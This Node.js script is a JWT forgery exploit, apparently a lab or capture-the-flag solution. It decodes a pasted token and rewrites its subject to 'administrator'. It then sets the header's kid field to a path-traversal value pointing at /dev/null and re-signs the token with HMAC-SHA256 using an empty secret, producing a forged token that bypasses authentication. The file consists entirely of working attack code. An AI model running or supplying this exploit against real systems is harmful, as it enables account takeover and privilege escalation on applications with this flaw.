const crypto = require('crypto');

// Helper function to encode string to Base64URL
function base64url(str) {
    return Buffer.from(str).toString('base64')
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
}

// Helper function to decode from Base64URL
function base64urlDecode(str) {
    str = str.padEnd(str.length + (4 - str.length % 4) % 4, '=')
        .replace(/-/g, '+')
        .replace(/_/g, '/');
    return Buffer.from(str, 'base64').toString();
}

// Paste JWT token here
const token = 'INSERT_TOKEN_HERE';

if (token === 'INSERT_TOKEN_HERE') {
    console.log("Please insert a valid token before running.");
    process.exit(1);
}

// Decode the token payload (without verifying)
const parts = token.split('.');
if (parts.length === 3) {
    const payload = JSON.parse(base64urlDecode(parts[1]));
    console.log('Decoded payload:', payload, '\n');

    // Modify the token (JWT manipulation)
    payload.sub = 'administrator';
    console.log('Modified payload:', payload, '\n');

    // Setup the overridden JWT Header
    const header = {
        kid: "../../../dev/null",
        alg: "HS256"
    };

    // Re-encode header and payload
    const headerB64 = base64url(JSON.stringify(header));
    const payloadB64 = base64url(JSON.stringify(payload));
    const sigInput = `${headerB64}.${payloadB64}`;

    // Sign with an empty string as the secret (matches Python's '')
    const hmac = crypto.createHmac('sha256', '');
    hmac.update(sigInput);
    
    // Base64URL encode the signature bytes
    const signature = hmac.digest('base64')
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');

    // Generate the final token
    const modifiedToken = `${sigInput}.${signature}`;
    console.log(`Modified token: ${modifiedToken}\n`);
} else {
    console.log('Invalid token format');
}
